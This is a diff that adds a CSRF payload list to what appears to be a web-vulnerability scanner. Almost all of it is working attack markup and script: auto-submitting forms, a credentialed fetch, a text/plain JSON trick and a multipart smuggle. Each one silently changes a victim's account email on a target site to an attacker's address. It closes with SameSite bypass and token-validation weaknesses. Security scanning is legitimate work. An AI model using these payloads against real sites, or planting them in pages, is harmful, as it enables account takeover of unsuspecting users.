@@ -1,0 +1,39 @@
+# CSRF Payloads — cyberm4fia-scanner
+# Categories: HTML Forms, JSON, Multipart, SameSite Bypass
+
+# ─── Classic HTML Form ───
+<form action="https://target.com/account/email" method="POST">
+  <input name="email" value="attacker@evil.com">
+  <input name="confirm" value="attacker@evil.com">
+</form><script>document.forms[0].submit()</script>
+
+# ─── JSON Endpoint via fetch ───
+<script>
+fetch('https://target.com/api/email',{
+  method:'POST',mode:'no-cors',credentials:'include',
+  headers:{'Content-Type':'text/plain'},
+  body:'{"email":"attacker@evil.com"}'
+});
+</script>
+
+# ─── JSON via Form (text/plain trick) ───
+<form action="https://target.com/api/email" method="POST" enctype="text/plain">
+  <input name='{"email":"attacker@evil.com","x":"' value='"}'>
+</form><script>document.forms[0].submit()</script>
+
+# ─── Multipart Smuggle ───
+<form action="https://target.com/api/email" method="POST" enctype="multipart/form-data">
+  <input name='x" \r\nContent-Type: application/json\r\n\r\n{"email":"attacker@evil.com"}\r\n--x' value='x'>
+</form>
+
+# ─── SameSite Bypass Patterns ───
+# - Lax + top-level POST: <a target="_top"> + form
+# - Lax + top-level GET: state-changing GETs exploitable
+# - Subdomain takeover + cookie scope .target.com = same-site
+# - Lax+POST 2-minute window (Chrome)
+
+# ─── Token Validation Flaws ───
+# - Omit CSRF token → still accepted
+# - Token not tied to session
+# - Token reused across users
+# - Origin/Referer only checked on POST (try PUT/DELETE/PATCH)
